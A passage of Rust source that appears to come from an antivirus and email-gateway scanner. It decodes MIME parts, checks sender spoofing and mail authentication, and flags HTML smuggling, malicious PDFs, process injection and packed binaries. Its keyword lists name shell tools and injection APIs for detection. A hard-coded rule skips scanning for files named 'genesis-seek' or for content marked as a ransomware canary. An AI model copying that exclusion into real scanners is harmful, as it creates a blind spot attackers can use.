    let has_auto = combined_lower.contains("/openaction") || combined_lower.contains("/aa");
    let has_active_payload = combined_lower.contains("/js")
        || combined_lower.contains("/javascript")
        || combined_lower.contains("/launch")
        || combined_lower.contains("cmd.exe")
        || combined_lower.contains("powershell")
        || combined_lower.contains("/bin/sh");
    if has_auto && has_active_payload {
        return Some(detection(
            virtual_path,
            outer_sha,
            outer_entropy,
            "Exploit.PDF.ActiveScriptOrLaunch",
            "Exploit.PDF",
            "High",
            "Deep PDF Stream Inspector",
            "PDF embeds automatic trigger (/OpenAction or /AA) paired with /JavaScript or /Launch command execution.".to_string(),
        ));
    }
    None
}

fn decode_quoted_printable(input: &str) -> Vec<u8> {
    let bytes = input.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0usize;
    while i < bytes.len() && out.len() < MAX_MEMBER_UNPACK_BYTES {
        if bytes[i] == b'=' {
            if i + 2 < bytes.len() && bytes[i + 1] == b'\r' && bytes[i + 2] == b'\n' {
                i += 3;
                continue;
            }
            if i + 1 < bytes.len() && (bytes[i + 1] == b'\n' || bytes[i + 1] == b'\r') {
                i += 2;
                continue;
            }
            if i + 2 < bytes.len() {
                let h1 = bytes[i + 1] as char;
                let h2 = bytes[i + 2] as char;
                if let (Some(d1), Some(d2)) = (h1.to_digit(16), h2.to_digit(16)) {
                    out.push(((d1 << 4) | d2) as u8);
                    i += 3;
                    continue;
                }
            }
        }
        out.push(bytes[i]);
        i += 1;
    }
    out
}

fn decode_mime_base64(input: &str) -> Option<Vec<u8>> {
    let cleaned: Vec<u8> = input
        .bytes()
        .filter(|b| !b.is_ascii_whitespace())
        .take(MAX_MEMBER_UNPACK_BYTES)
        .collect();
    if cleaned.len() < 4 {
        return None;
    }
    base64::engine::general_purpose::STANDARD
        .decode(&cleaned)
        .or_else(|_| {
            let trimmed = cleaned
                .iter()
                .copied()
                .take_while(|&b| b != b'=')
                .collect::<Vec<u8>>();
            base64::engine::general_purpose::STANDARD_NO_PAD.decode(&trimmed)
        })
        .ok()
}

fn split_headers_and_body(raw: &str) -> (&str, &str) {
    if let Some(idx) = raw.find("\r\n\r\n") {
        (&raw[..idx], &raw[idx + 4..])
    } else if let Some(idx) = raw.find("\n\n") {
        (&raw[..idx], &raw[idx + 2..])
    } else {
        (raw, "")
    }
}

fn unfold_email_headers(header_block: &str) -> Vec<(String, String)> {
    let mut headers: Vec<(String, String)> = Vec::new();
    for line in header_block.lines() {
        let line = line.trim_end_matches('\r');
        if (line.starts_with(' ') || line.starts_with('\t')) && !headers.is_empty() {
            if let Some((_, val)) = headers.last_mut() {
                val.push(' ');
                val.push_str(line.trim());
            }
        } else if let Some((k, v)) = line.split_once(':') {
            headers.push((k.trim().to_ascii_lowercase(), v.trim().to_string()));
        }
    }
    headers
}

fn extract_mime_param(header_val: &str, param_name: &str) -> Option<String> {
    let target = format!("{}=", param_name.to_ascii_lowercase());
    for seg in header_val.split(';') {
        let trimmed = seg.trim();
        let low = trimmed.to_ascii_lowercase();
        if let Some( idx ) = low.find(&target) {
            if idx == 0 || !low.as_bytes()[idx - 1].is_ascii_alphanumeric() {
                let raw_val = trimmed[idx + target.len()..].trim();
                let unquoted = raw_val
                    .trim_matches('"')
                    .trim_matches('\'')
                    .trim()
                    .to_string();
                if !unquoted.is_empty() {
                    return Some(unquoted);
                }
            }
        }
    }
    None
}

fn extract_email_address_domain(header_val: &str) -> Option<String> {
    let addr_part = if let (Some(lt), Some(gt)) = (header_val.rfind('<'), header_val.rfind('>')) {
        if lt < gt {
            &header_val[lt + 1..gt]
        } else {
            header_val
        }
    } else {
        header_val
    };
    let domain = addr_part
        .rsplit('@')
        .next()?
        .trim()
        .trim_matches(|c: char| !c.is_ascii_alphanumeric() && c != '.' && c != '-')
        .to_ascii_lowercase();
    if domain.contains('.') && !domain.contains(' ') {
        Some(domain)
    } else {
        None
    }
}

fn detect_display_name_brand_or_domain_spoof(from_val: &str, actual_domain: &str) -> Option<String> {
    let Some(lt) = from_val.rfind('<') else {
        return None;
    };
    let display = from_val[..lt]
        .trim()
        .trim_matches('"')
        .trim_matches('\'')
        .to_ascii_lowercase();
    if display.is_empty() {
        return None;
    }
    // 1. Display name embeds an @domain.tld different from the actual angle-bracket sender domain
    if let Some(at_pos) = display.find('@') {
        let rest = &display[at_pos + 1..];
        let spoof_dom: String = rest
            .chars()
            .take_while(|c| c.is_ascii_alphanumeric() || *c == '.' || *c == '-')
            .collect();
        if spoof_dom.contains('.')
            && spoof_dom != actual_domain
            && !actual_domain.ends_with(&format!(".{}", spoof_dom))
        {
            return Some(format!(
                "Display name impersonates '@{}' while actual sender domain is '{}'",
                spoof_dom, actual_domain
            ));
        }
    }
    // 2. Display name impersonates high-value brand while sender is an unrelated domain
    const BRAND_DOMAINS: &[(&str, &[&str])] = &[
        ("paypal", &["paypal.com", "paypal-communication.com"]),
        ("microsoft", &["microsoft.com", "office.com", "live.com", "outlook.com"]),
        ("apple", &["apple.com", "icloud.com"]),
        ("docusign", &["docusign.net", "docusign.com"]),
        ("chase bank", &["chase.com", "jpmchase.com"]),
        ("bank of america", &["bankofamerica.com", "bofa.com"]),
    ];
    for (brand, allowed_doms) in BRAND_DOMAINS {
        if display.contains(brand)
            && !allowed_doms
                .iter()
                .any(|d| actual_domain == *d || actual_domain.ends_with(&format!(".{}", d)))
        {
            return Some(format!(
                "Brand display name '{}' sent from unauthorized domain '{}'",
                brand, actual_domain
            ));
        }
    }
    None
}

fn is_html_smuggling_payload(lower_html: &str) -> bool {
    let has_blob = lower_html.contains("new blob(")
        || lower_html.contains("window.blob")
        || lower_html.contains("application/octet-stream")
        || lower_html.contains("application/x-msdownload");
    let has_url_or_save = lower_html.contains("createobjecturl")
        || lower_html.contains("mssaveoropenblob")
        || lower_html.contains("mssaveblob");
    let has_decode = lower_html.contains("atob(")
        || lower_html.contains("uint8array")
        || lower_html.contains("fromcharcode");
    has_blob && has_url_or_save && has_decode
}

fn inspect_mime_entity(
    virtual_path: &str,
    headers: &[(String, String)],
    body: &str,
    depth: u8,
    attachments_inspected: &mut usize,
    urls_inspected: &mut usize,
    findings: &mut Vec<String>,
) -> Option<ThreatDetection> {
    if depth > MAX_ARCHIVE_DEPTH {
        return None;
    }
    let content_type = headers
        .iter()
        .find(|(k, _)| k == "content-type")
        .map(|(_, v)| v.as_str())
        .unwrap_or("text/plain");
    let content_disp = headers
        .iter()
        .find(|(k, _)| k == "content-disposition")
        .map(|(_, v)| v.as_str())
        .unwrap_or("");
    let transfer_enc = headers
        .iter()
        .find(|(k, _)| k == "content-transfer-encoding")
        .map(|(_, v)| v.to_ascii_lowercase())
        .unwrap_or_default();

    // Handle multipart/* container recursively
    if content_type.to_ascii_lowercase().contains("multipart/") {
        if let Some(boundary) = extract_mime_param(content_type, "boundary") {
            let delim = format!("--{}", boundary);
            let end_delim = format!("--{}--", boundary);
            for (part_idx, raw_part) in body.split(&delim).skip(1).take(MAX_ARCHIVE_ENTRIES).enumerate() {
                let trimmed_part = raw_part.trim_start_matches(['\r', '\n']);
                if trimmed_part.starts_with("--") || raw_part.contains(&end_delim) && trimmed_part.is_empty() {
                    break;
                }
                let clean_part = trimmed_part
                    .strip_suffix(&end_delim)
                    .unwrap_or(trimmed_part);
                let (p_hdr_raw, p_body) = split_headers_and_body(clean_part);
                let p_headers = unfold_email_headers(p_hdr_raw);
                let part_vpath = format!("{}::mime_{}", virtual_path, part_idx + 1);
                if let Some(det) = inspect_mime_entity(
                    &part_vpath,
                    &p_headers,
                    p_body,
                    depth + 1,
                    attachments_inspected,
                    urls_inspected,
                    findings,
                ) {
                    return Some(det);
                }
            }
            return None;
        }
    }

    let att_name = extract_mime_param(content_disp, "filename")
        .or_else(|| extract_mime_param(content_type, "name"));

    let decoded_bytes = if transfer_enc.contains("base64") {
        decode_mime_base64(body).unwrap_or_else(|| body.as_bytes().to_vec())
    } else if transfer_enc.contains("quoted-printable") {
        decode_quoted_printable(body)
    } else {
        body.as_bytes().to_vec()
    };

    if decoded_bytes.is_empty() {
        return None;
    }

    let part_sha = hex::encode(Sha256::digest(&decoded_bytes));
    let part_entropy = calculate_entropy(&decoded_bytes);

    if let Some(ref fname) = att_name {
        *attachments_inspected += 1;
        let part_vpath = format!("{}::attachment({})", virtual_path, fname);

        if fname.contains('\u{202E}')
            || fname.contains('\u{202B}')
            || fname.contains('\u{202D}')
            || DOUBLE_EXT_REGEX.is_match(fname)
        {
            findings.push(format!("Masqueraded MIME attachment filename: {}", fname));
            return Some(detection(
                &part_vpath,
                &part_sha,
                part_entropy,
                "Heur.Mail.MasqueradeAttachment",
                "MailGateway.Attachment",
                "Critical",
                "Mail Gateway MIME Inspector",
                format!(
                    "Email attachment '{}' uses double-extension or Unicode RLO masquerading.",
                    fname
                ),
            ));
        }

        if let Some(det) = scan_buffer_layers(
            &part_vpath,
            fname,
            &decoded_bytes,
            &part_sha,
            depth + 1,
            false,
        ) {
            findings.push(format!(
                "Malicious MIME attachment '{}': {}",
                fname, det.threat_name
            ));
            return Some(det);
        }

        let ext = Path::new(fname)
            .extension()
            .map(|e| e.to_string_lossy().to_ascii_lowercase())
            .unwrap_or_default();
        if matches!(
            ext.as_str(),
            "exe" | "scr" | "hta" | "vbs" | "vbe" | "jse" | "wsf" | "bat" | "cmd" | "ps1" | "lnk" | "cpl"
        ) {
            findings.push(format!("Blocked high-risk executable attachment: {}", fname));
            return Some(detection(
                &part_vpath,
                &part_sha,
                part_entropy,
                "Heur.Mail.ExecutableAttachmentDropper",
                "MailGateway.Attachment",
                "High",
                "Mail Gateway MIME Policy Engine",
                format!(
                    "Email carries high-risk executable or script attachment ('{}').",
                    fname
                ),
            ));
        }
    } else {
        let text_lossy = String::from_utf8_lossy(&decoded_bytes);
        let lower_text = text_lossy.to_ascii_lowercase();
        let is_html = content_type.to_ascii_lowercase().contains("text/html")
            || lower_text.contains("<html")
            || lower_text.contains("<script");

        if is_html && is_html_smuggling_payload(&lower_text) {
            findings.push("HTML Smuggling payload (Blob + createObjectURL + Base64/TypedArray)".to_string());
            return Some(detection(
                virtual_path,
                &part_sha,
                part_entropy,
                "Heur.Mail.HTMLSmugglingDropper",
                "MailGateway.Exploit",
                "Critical",
                "Mail Gateway HTML Smuggling Guard",
                "Email HTML body constructs an in-browser binary payload via JavaScript Blob/createObjectURL smuggling.".to_string(),
            ));
        }

        static EMAIL_URL_RE: Lazy<Regex> =
            Lazy::new(|| Regex::new(r#"https?://[^\s"'<>)\]]+"#).unwrap());
        for m in EMAIL_URL_RE.find_iter(&text_lossy).take(24) {
            *urls_inspected += 1;
            let url = m.as_str();
            let verdict = realtime_shield::evaluate_url_safety(url);
            if !verdict.safe {
                findings.push(format!("Malicious URL in email body: {} ({})", url, verdict.category));
                return Some(detection(
                    virtual_path,
                    &part_sha,
                    part_entropy,
                    "Heur.Mail.PhishingOrMalwareLink",
                    "MailGateway.Phishing",
                    "High",
                    "Mail Gateway URL Reputation Engine",
                    format!(
                        "Email embeds blocked phishing/malware URL '{}' ({}: {}).",
                        url, verdict.category, verdict.reason
                    ),
                ));
            }
        }

        if let Some(det) = scan_buffer_layers(
            virtual_path,
            "email_body.txt",
            &decoded_bytes,
            &part_sha,
            depth + 1,
            false,
        ) {
            findings.push(format!("Malicious payload in email body: {}", det.threat_name));
            return Some(det);
        }
    }

    None
}

/// Inspect a raw RFC 5322 `.eml` / MIME message across headers (SPF/DKIM/DMARC, display-name &
/// Reply-To spoofing), multi-part Base64/Quoted-Printable attachments, HTML smuggling, and body URLs.
pub fn inspect_raw_email_gateway(
    virtual_path: &str,
    raw_email: &[u8],
    depth: u8,
) -> EmailGatewayReport {
    let raw_str = String::from_utf8_lossy(raw_email);
    let (hdr_block, body_block) = split_headers_and_body(&raw_str);
    let headers = unfold_email_headers(hdr_block);

    let get_hdr = |name: &str| -> String {
        headers
            .iter()
            .find(|(k, _)| k == name)
            .map(|(_, v)| v.clone())
            .unwrap_or_default()
    };

    let sender_from = get_hdr("from");
    let reply_to = get_hdr("reply-to");
    let return_path = get_hdr("return-path");
    let subject = get_hdr("subject");
    let auth_results = format!(
        "{} {}",
        get_hdr("authentication-results"),
        get_hdr("received-spf")
    )
    .to_ascii_lowercase();

    let parse_auth_token = |key: &str| -> String {
        for tok in ["fail", "softfail", "temperror", "permerror", "none", "pass"] {
            if auth_results.contains(&format!("{}={}", key, tok)) {
                return tok.to_string();
            }
        }
        if key == "spf" && auth_results.starts_with("fail") {
            return "fail".to_string();
        }
        if key == "spf" && auth_results.starts_with("pass") {
            return "pass".to_string();
        }
        "not_present".to_string()
    };

    let spf_status = parse_auth_token("spf");
    let dkim_status = parse_auth_token("dkim");
    let dmarc_status = parse_auth_token("dmarc");

    let mut findings = Vec::new();
    let mut risk_score: u8 = 0;

    let from_domain = extract_email_address_domain(&sender_from);
    let reply_domain = extract_email_address_domain(&reply_to);

    if let Some(ref f_dom) = from_domain {
        if let Some(spoof_msg) = detect_display_name_brand_or_domain_spoof(&sender_from, f_dom) {
            findings.push(spoof_msg);
            risk_score = risk_score.saturating_add(75);
        }
    }

    let auth_failed = spf_status == "fail"
        || spf_status == "softfail"
        || dkim_status == "fail"
        || dmarc_status == "fail";
    if auth_failed {
        findings.push(format!(
            "Email authentication failure (SPF={}, DKIM={}, DMARC={})",
            spf_status, dkim_status, dmarc_status
        ));
        risk_score = risk_score.saturating_add(45);
    }

    if let (Some(ref f_dom), Some(ref r_dom)) = (&from_domain, &reply_domain) {
        if f_dom != r_dom
            && !r_dom.ends_with(&format!(".{}", f_dom))
            && !f_dom.ends_with(&format!(".{}", r_dom))
        {
            findings.push(format!(
                "Cross-domain Reply-To mismatch (From '{}' vs Reply-To '{}')",
                f_dom, r_dom
            ));
            risk_score = risk_score.saturating_add(35);
        }
    }

    let lower_subj_body = format!("{} {}", subject, body_block).to_ascii_lowercase();
    let has_phish_lure = [
        "verify your account",
        "urgent wire transfer",
        "password expire",
        "unusual sign-in",
        "payment suspended",
        "update your billing",
        "security alert",
    ]
    .iter()
    .any(|k| lower_subj_body.contains(k));
    if has_phish_lure && (auth_failed || risk_score >= 35) {
        findings.push("High-urgency credential or financial social-engineering lure".to_string());
        risk_score = risk_score.saturating_add(30);
    }

    let mut attachments_inspected = 0usize;
    let mut urls_inspected = 0usize;
    let mime_det = inspect_mime_entity(
        virtual_path,
        &headers,
        body_block,
        depth,
        &mut attachments_inspected,
        &mut urls_inspected,
        &mut findings,
    );

    if let Some(det) = mime_det {
        return EmailGatewayReport {
            safe: false,
            verdict: if det.category.contains("Phishing") {
                "QUARANTINE_PHISHING".to_string()
            } else {
                "REJECT_MALWARE".to_string()
            },
            risk_score: 98,
            sender_from,
            reply_to,
            return_path,
            subject,
            spf_status,
            dkim_status,
            dmarc_status,
            attachments_inspected,
            urls_inspected,
            threat_name: Some(det.threat_name),
            severity: det.severity,
            findings,
        };
    }

    if risk_score >= 70 {
        return EmailGatewayReport {
            safe: false,
            verdict: "QUARANTINE_PHISHING".to_string(),
            risk_score: risk_score.min(95),
            sender_from,
            reply_to,
            return_path,
            subject,
            spf_status,
            dkim_status,
            dmarc_status,
            attachments_inspected,
            urls_inspected,
            threat_name: Some("Heur.Mail.PhishingHeaderSpoof".to_string()),
            severity: "High".to_string(),
            findings,
        };
    }

    EmailGatewayReport {
        safe: true,
        verdict: if risk_score >= 40 {
            "SUSPICIOUS_AUTH".to_string()
        } else {
            "CLEAN".to_string()
        },
        risk_score,
        sender_from,
        reply_to,
        return_path,
        subject,
        spf_status,
        dkim_status,
        dmarc_status,
        attachments_inspected,
        urls_inspected,
        threat_name: None,
        severity: "Safe".to_string(),
        findings,
    }
}

fn is_rfc5322_email_buffer(file_name: &str, buffer: &[u8]) -> bool {
    let lower = file_name.to_ascii_lowercase();
    if lower.ends_with(".eml") || lower.ends_with(".mbox") {
        return true;
    }
    let head = String::from_utf8_lossy(&buffer[..buffer.len().min(1024)]);
    let mut header_hits = 0usize;
    for line in head.lines().take(15) {
        let l = line.to_ascii_lowercase();
        if l.starts_with("from:")
            || l.starts_with("return-path:")
            || l.starts_with("received:")
            || l.starts_with("mime-version:")
            || l.starts_with("authentication-results:")
            || l.starts_with("content-type: multipart/")
        {
            header_hits += 1;
        }
    }
    header_hits >= 2
}

fn inspect_email_or_mbox_buffer(
    virtual_path: &str,
    file_name: &str,
    buffer: &[u8],
    outer_sha: &str,
    outer_entropy: f64,
    depth: u8,
) -> Option<ThreatDetection> {
    let raw_str = String::from_utf8_lossy(buffer);
    let is_mbox = file_name.to_ascii_lowercase().ends_with(".mbox")
        || (raw_str.starts_with("From ") && raw_str.contains("\nFrom:"));

    let messages: Vec<&str> = if is_mbox {
        raw_str
            .split("\nFrom ")
            .take(MAX_ARCHIVE_ENTRIES)
            .collect()
    } else {
        vec![raw_str.as_ref()]
    };

    for (idx, msg) in messages.into_iter().enumerate() {
        let msg_vpath = if messages_len_gt_one(idx, is_mbox) {
            format!("{}::mbox_msg_{}", virtual_path, idx + 1)
        } else {
            virtual_path.to_string()
        };
        let rep = inspect_raw_email_gateway(&msg_vpath, msg.as_bytes(), depth);
        if !rep.safe {
            let threat = rep
                .threat_name
                .unwrap_or_else(|| "Heur.Mail.GatewayThreat".to_string());
            let summary = if rep.findings.is_empty() {
                format!("Mail Gateway blocked message ({}).", rep.verdict)
            } else {
                rep.findings.join(" | ")
            };
            return Some(detection(
                &msg_vpath,
                outer_sha,
                outer_entropy,
                &threat,
                "MailGateway.Protection",
                &rep.severity,
                "Mail Gateway MIME & Header Inspector",
                summary,
            ));
        }
    }
    None
}

fn messages_len_gt_one(idx: usize, is_mbox: bool) -> bool {
    is_mbox || idx > 0
}

/// Scan an arbitrary in-memory file/archive byte stream (for the Local HTTP Gateway `/gateway/scan-stream` endpoint).
pub fn scan_raw_stream_gateway(stream_name: &str, data: &[u8]) -> Option<ThreatDetection> {
    if data.is_empty() || data.len() as u64 > MAX_FILE_BYTES {
        return None;
    }
    let sha256_hex = hex::encode(Sha256::digest(data));
    let entropy = calculate_entropy(data);
    if let Some(det) = check_hash_layers(stream_name, &sha256_hex, entropy) {
        return Some(det);
    }
    if data.starts_with(eicar_test_string().as_bytes()) {
        return Some(detection(
            stream_name,
            &sha256_hex,
            entropy,
            "EICAR-Standard-AV-Test-Signature",
            "Test.Signature",
            "High",
            "Signature Engine (EICAR)",
            "Standard EICAR antivirus verification test stream.".to_string(),
        ));
    }
    scan_buffer_layers(stream_name, stream_name, data, &sha256_hex, 0, false)
}

fn inspect_base64_layers(
    virtual_path: &str,
    content_lossy: &str,
    depth: u8,
) -> Option<ThreatDetection> {
    static B64_BLOB_RE: Lazy<Regex> =
        Lazy::new(|| Regex::new(r"[A-Za-z0-9+/]{40,8192}={0,2}").unwrap());

    for (idx, m) in B64_BLOB_RE.find_iter(content_lossy).take(16).enumerate() {
        let candidate = m.as_str();
        let decoded = base64::engine::general_purpose::STANDARD
            .decode(candidate)
            .or_else(|_| base64::engine::general_purpose::STANDARD_NO_PAD.decode(candidate.trim_end_matches('=')))
            .ok();
        let Some(bytes) = decoded else {
            continue;
        };
        if bytes.len() < 16 {
            continue;
        }
        let is_binary_stage = bytes.starts_with(b"MZ")
            || bytes.starts_with(b"\x7fELF")
            || bytes.starts_with(b"PK\x03\x04")
            || bytes.starts_with(b"\x1f\x8b")
            || bytes.starts_with(b"%PDF-");

        let normalized = extract_utf16le_ascii(&bytes).map(|s| s.into_bytes());
        let scan_bytes = normalized.as_deref().unwrap_or(&bytes);
        let printable_count = scan_bytes
            .iter()
            .filter(|&&b| (0x20..=0x7e).contains(&b) || matches!(b, b'\n' | b'\r' | b'\t'))
            .count();
        let is_text_stage = printable_count * 4 >= scan_bytes.len() * 3;
        if !is_binary_stage && !is_text_stage {
            continue;
        }

        let b64_vpath = format!("{}::b64_layer_{}", virtual_path, idx + 1);
        let b64_sha = hex::encode(Sha256::digest(scan_bytes));
        if let Some(det) = scan_buffer_layers(
            &b64_vpath,
            "decoded_b64.ps1",
            scan_bytes,
            &b64_sha,
            depth + 1,
            false,
        ) {
            return Some(det);
        }
    }
    None
}

fn check_hash_layers(
    virtual_path: &str,
    sha256_hex: &str,
    entropy: f64,
) -> Option<ThreatDetection> {
    if let Some(&(name, category, severity)) = KNOWN_HASHES.get(sha256_hex) {
        return Some(detection(
            virtual_path,
            sha256_hex,
            entropy,
            name,
            category,
            severity,
            "Signature Engine (SHA-256)",
            "Exact cryptographic hash match against core threat database.".to_string(),
        ));
    }
    if let Some((name, category, severity)) = lookup_sqlite_hash(sha256_hex) {
        return Some(detection(
            virtual_path,
            sha256_hex,
            entropy,
            &name,
            &category,
            &severity,
            "SQLite Threat DB (O(1) SHA-256)",
            "SHA-256 matched indexed local threat_hashes.db signature.".to_string(),
        ));
    }
    if threat_intel_and_net::is_known_malware_hash(sha256_hex) {
        return Some(detection(
            virtual_path,
            sha256_hex,
            entropy,
            "ThreatFeed.MalwareBazaar.Sample",
            "Malware",
            "Critical",
            "Signature Engine (MalwareBazaar feed)",
            "SHA-256 matches a recent malware sample published by abuse.ch MalwareBazaar.".to_string(),
        ));
    }
    None
}

fn scan_yara_rules(
    virtual_path: &str,
    sha256_hex: &str,
    entropy: f64,
    content_lossy: &str,
    raw: &[u8],
) -> Option<ThreatDetection> {
    if let Ok(engine) = SCANNER_ENGINE.read() {
        for rule in &engine.yara_rules {
            if rule.matches(content_lossy, raw) {
                return Some(detection(
                    virtual_path,
                    sha256_hex,
                    entropy,
                    &rule.name,
                    &rule.category,
                    &rule.severity,
                    "YARA-X Behavioral Engine",
                    rule.description.clone(),
                ));
            }
        }
    }
    None
}

/// Inspect an in-memory buffer across container unpackers, script de-obfuscation,
/// YARA rules, PE/ELF heuristics, local `clamd`, and optional cloud reputation.
fn scan_buffer_layers(
    virtual_path: &str,
    file_name: &str,
    buffer: &[u8],
    sha256_hex: &str,
    depth: u8,
    allow_cloud: bool,
) -> Option<ThreatDetection> {
    if buffer.is_empty() || depth > MAX_ARCHIVE_DEPTH {
        return None;
    }
    if depth > 0 && quarantine::is_allowlisted(sha256_hex) {
        return None;
    }

    let entropy = calculate_entropy(buffer);

    if depth > 0 {
        if let Some(det) = check_hash_layers(virtual_path, sha256_hex, entropy) {
            return Some(det);
        }
        let eicar = eicar_test_string();
        if buffer.starts_with(eicar.as_bytes())
            || String::from_utf8_lossy(buffer).contains(&eicar)
        {
            return Some(detection(
                virtual_path,
                sha256_hex,
                entropy,
                "EICAR-Standard-AV-Test-Signature",
                "Test.Signature",
                "High",
                "Signature Engine (EICAR)",
                "Standard EICAR antivirus signature detected inside unpacked container or script layer.".to_string(),
            ));
        }
        if DOUBLE_EXT_REGEX.is_match(file_name) {
            return Some(detection(
                virtual_path,
                sha256_hex,
                entropy,
                "Heur.Masquerade.DoubleExtension",
                "Trojan.Masquerade",
                "High",
                "Heuristic File Anomaly",
                format!("Executable disguised with deceptive double file extension ({}).", file_name),
            ));
        }
        if let Some(reason) = is_disguised_executable_header(Path::new(file_name), buffer) {
            return Some(detection(
                virtual_path,
                sha256_hex,
                entropy,
                "Heur.Masquerade.DisguisedMagicHeader",
                "Trojan.Masquerade",
                "Critical",
                "Magic Header Inspector (ELF/PE)",
                format!("{} ({}).", reason, file_name),
            ));
        }
    }

    // Container, Archive & Document Unpacking (depth-bounded).
    if depth < MAX_ARCHIVE_DEPTH {
        if buffer.starts_with(b"PK\x03\x04") {
            if let Some(det) = inspect_zip_buffer(virtual_path, buffer, sha256_hex, entropy, depth) {
                return Some(det);
            }
        } else if buffer.starts_with(b"\x1f\x8b") {
            if let Some(det) =
                inspect_gzip_buffer(virtual_path, file_name, buffer, sha256_hex, entropy, depth)
            {
                return Some(det);
            }
        } else if is_tar_buffer(buffer) {
            if let Some(det) = inspect_tar_buffer(virtual_path, buffer, sha256_hex, entropy, depth) {
                return Some(det);
            }
        } else if buffer.starts_with(b"%PDF-") {
            if let Some(det) = inspect_pdf_buffer(virtual_path, buffer, sha256_hex, entropy, depth) {
                return Some(det);
            }
        } else if buffer.starts_with(b"\xD0\xCF\x11\xE0") {
            if let Some(det) = detect_office_macro_threat(virtual_path, sha256_hex, entropy, buffer)
            {
                return Some(det);
            }
        } else if is_rfc5322_email_buffer(file_name, buffer) {
            if let Some(det) = inspect_email_or_mbox_buffer(
                virtual_path,
                file_name,
                buffer,
                sha256_hex,
                entropy,
                depth,
            ) {
                return Some(det);
            }
        }
    }

    // Windows Shell Link (.lnk) Dropper Inspection
    if let Some(det) = inspect_lnk_shortcut(virtual_path, buffer, sha256_hex, entropy) {
        return Some(det);
    }

    let content_lossy = String::from_utf8_lossy(buffer);
    let lower_lossy = content_lossy.to_lowercase();
    let lower_name = file_name.to_ascii_lowercase();
    if lower_name.ends_with(".yar")
        || lower_name.ends_with(".yara")
        || lower_name == "genesis-seek.exe"
        || lower_name == "genesis-seek"
        || lower_name.starts_with("genesis.seek_")
        || lower_name.starts_with("genesis-seek-")
        || (content_lossy.contains("GENESIS SEEK RANSOMWARE CANARY")
            && content_lossy.contains("Genesis_AppID_IOCTL_Exploit_CVE_2024_21338"))
    {
        return None;
    }

    // Script De-obfuscation: UTF-16LE wide script text + Base64 dropper layers.
    if let Some(utf16_text) = extract_utf16le_ascii(buffer) {
        if utf16_text.contains(&eicar_test_string()) {
            return Some(detection(
                virtual_path,
                sha256_hex,
                entropy,
                "EICAR-Standard-AV-Test-Signature",
                "Test.Signature",
                "High",
                "UTF-16LE De-obfuscation Engine",
                "EICAR test signature revealed after UTF-16LE decoding.".to_string(),
            ));
        }
        if let Some(det) =
            scan_yara_rules(virtual_path, sha256_hex, entropy, &utf16_text, utf16_text.as_bytes())
        {
            return Some(det);
        }
    }

    if depth < MAX_ARCHIVE_DEPTH
        && !buffer.starts_with(b"PK\x03\x04")
        && !buffer.starts_with(b"\x1f\x8b")
        && !is_tar_buffer(buffer)
    {
        if let Some(det) = inspect_base64_layers(virtual_path, &content_lossy, depth) {
            return Some(det);
        }
    }

    // Binary IOCTL & UTF-8 byte sequence heuristics (CVE-2024-21338 & CVE-2024-43468)
    let has_appid_ioctl = buffer.windows(4).any(|w| w == [0x18, 0xA0, 0x22, 0x00]);
    if has_appid_ioctl && (lower_lossy.contains("appid") || lower_lossy.contains("smartscreen")) {
        return Some(detection(
            virtual_path,
            sha256_hex,
            entropy,
            "CVE_2024_21338_AppId_Kernel_BYOVD_Abuse",
            "Exploit.KernelBYOVD",
            "Critical",
            "Binary IOCTL Inspector (CVE-2024-21338)",
            "CVE-2024-21338 Windows Kernel appid.sys raw IOCTL 0x22A018 memory write / FudModule rootkit payload.".to_string(),
        ));
    }
    let has_rlo_bytes = buffer
        .windows(3)
        .any(|w| w == [0xE2, 0x80, 0xAE] || w == [0xE2, 0x80, 0xAD]);
    if has_rlo_bytes
        && (lower_name.ends_with(".hta")
            || lower_name.ends_with(".lnk")
            || lower_name.ends_with(".url"))
    {
        return Some(detection(
            virtual_path,
            sha256_hex,
            entropy,
            "CVE_2024_43468_MSHTML_Unicode_RLO_Spoof",
            "Exploit.MSHTML",
            "High",
            "Binary Byte Inspector (CVE-2024-43468)",
            "CVE-2024-43468 MSHTML platform RCE via embedded UTF-8 Right-to-Left Override bytes.".to_string(),
        ));
    }

    // Compiled YARA-X / Pure-Rust YARA rules engine (`SCANNER_ENGINE`).
    if let Some(det) = scan_yara_rules(virtual_path, sha256_hex, entropy, &content_lossy, buffer) {
        return Some(det);
    }

    // Deep PE/ELF Binary Heuristics (Tampered UPX, High-Entropy UPX, PE Injection Triad, ELF Fileless/Ptrace).
    let is_pe = buffer.starts_with(b"MZ");
    let is_elf = buffer.starts_with(b"\x7fELF");
    let is_known_sfx_installer = content_lossy.contains("7-Zip")
        || content_lossy.contains("Nullsoft")
        || content_lossy.contains("Inno Setup")
        || content_lossy.contains("Mozilla")
        || content_lossy.contains("WiX Toolset")
        || content_lossy.contains("Windows Installer");
    if (is_pe || is_elf)
        && !is_known_sfx_installer
        && !content_lossy.contains("UPX!")
        && buffer.windows(4).any(|w| w == b"UPX0" || w == b"UPX1")
    {
        return Some(detection(
            virtual_path,
            sha256_hex,
            entropy,
            "Heur.Packed.TamperedUPX",
            "Trojan.Packer",
            "High",
            "Deep PE/ELF Packer Inspector",
            "Executable contains UPX section markers (UPX0/UPX1) with stripped UPX! header signature (anti-unpacking tamper).".to_string(),
        ));
    }
    if (is_pe || is_elf)
        && !is_known_sfx_installer
        && entropy > 6.55
        && content_lossy.contains("UPX!")
    {
        return Some(detection(
            virtual_path,
            sha256_hex,
            entropy,
            "Heur.Packed.SuspiciousBinary",
            "Suspicious.Packer",
            "Medium",
            "Entropy & Packer Analyzer",
            format!("UPX-packed executable binary with high Shannon entropy ({} bits/byte).", entropy),
        ));
    }
    if is_pe
        && lower_lossy.contains("virtualallocex")
        && lower_lossy.contains("writeprocessmemory")
        && (lower_lossy.contains("createremotethread")
            || lower_lossy.contains("queueuserapc")
            || lower_lossy.contains("ntcreatethreadex"))
    {
        return Some(detection(
            virtual_path,
            sha256_hex,
            entropy,
            "Heur.PE.ProcessInjectionTriad",
            "Trojan.Injector",
            "High",
            "Deep PE Import Heuristic",
            "PE binary imports remote process memory allocation, write, and execution triad (VirtualAllocEx + WriteProcessMemory + CreateRemoteThread/APC).".to_string(),
        ));
    }
    if is_elf
        && ((lower_lossy.contains("memfd_create")
            && (lower_lossy.contains("/proc/self/fd/") || lower_lossy.contains("execveat")))
            || (lower_lossy.contains("ptrace") && lower_lossy.contains("ptrace_poketext")))
    {
        return Some(detection(
            virtual_path,
            sha256_hex,
            entropy,
            "Heur.ELF.FilelessMemfdOrPtrace",
            "Rootkit.Linux",
            "High",
            "Deep ELF Behavioral Heuristic",
